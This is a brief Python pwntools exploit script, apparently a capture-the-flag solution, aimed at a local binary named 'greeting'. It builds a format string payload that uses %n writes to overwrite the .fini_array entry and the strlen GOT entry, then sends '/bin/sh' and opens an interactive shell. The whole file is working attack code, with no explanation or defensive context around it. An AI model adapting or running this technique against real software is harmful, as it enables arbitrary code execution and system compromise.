from pwn import *

io = process('./greeting')
#io = gdb.debug('./greeting')

payload = b"AA"

payload += p32(0x08049934) # .fini_array
payload += p32(0x08049934 + 2)

payload += p32(0x08049a54) # strlen GOT entry
payload += p32(0x08049a54 + 2)

payload += b"%34288x"
payload += b"%12$n"

payload += b"%65148x"
payload += b"%14$n"

payload += b"%33652x"
payload += b"%13$n"
payload += b"%15$n"

print ("len: " + str(len(payload)))

io.sendline(payload)
io.sendline(b'/bin/sh')

io.interactive()

